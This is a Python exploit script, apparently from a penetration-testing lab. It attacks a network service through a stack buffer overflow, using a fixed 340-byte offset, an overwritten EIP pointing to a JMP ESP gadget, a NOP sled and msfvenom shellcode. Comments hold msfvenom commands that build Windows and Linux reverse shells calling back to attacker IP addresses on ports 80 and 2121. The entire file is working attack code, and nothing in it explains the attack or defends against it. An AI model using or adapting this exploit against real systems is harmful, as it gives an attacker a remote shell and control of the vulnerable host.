 #!/usr/bin/python3

import socket
import sys
import time

if len(sys.argv) < 3:
	print("\nUsage: " + sys.argv[0] + " <HOST> <PORT>\n")
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]

offset = 340

# PUSH ESP; RET
# CALL ESP
# JMP ESP
EIP = b"\x03\x15\x10\x41"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.31 LPORT=80 EXITFUNC=thread -f python -a x86 –platform windows -b "\x00\x51"
# msfvenom -p linux/x86/shell_reverse_tcp -b "\x00" LHOST=192.168.49.209 LPORT=2121 EXITFUNC=thread -f python
buf =  b""
buf += b"\xda\xc5\xd9\x74\x24\xf4\x5a\x2b\xc9\xbd\xbf\xed\x6a"
buf += b"\xf0\xb1\x12\x31\x6a\x17\x03\x6a\x17\x83\x7d\xe9\x88"
buf += b"\x05\xb0\x29\xbb\x05\xe1\x8e\x17\xa0\x07\x98\x79\x84"
buf += b"\x61\x57\xf9\x76\x34\xd7\xc5\xb5\x46\x5e\x43\xbf\x2e"
buf += b"\xa1\x1b\x0e\x7f\x49\x5e\x71\x77\xc3\xd7\x90\x37\xb5"
buf += b"\xb7\x03\x64\x89\x3b\x2d\x6b\x20\xbb\x7f\x03\xd5\x93"
buf += b"\x0c\xbb\x41\xc3\xdd\x59\xfb\x92\xc1\xcf\xa8\x2d\xe4"
buf += b"\x5f\x45\xe3\x67"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.send(b"A" * offset + EIP + b"\x90"*20 + buf)
s.recv(1024)
s.close()
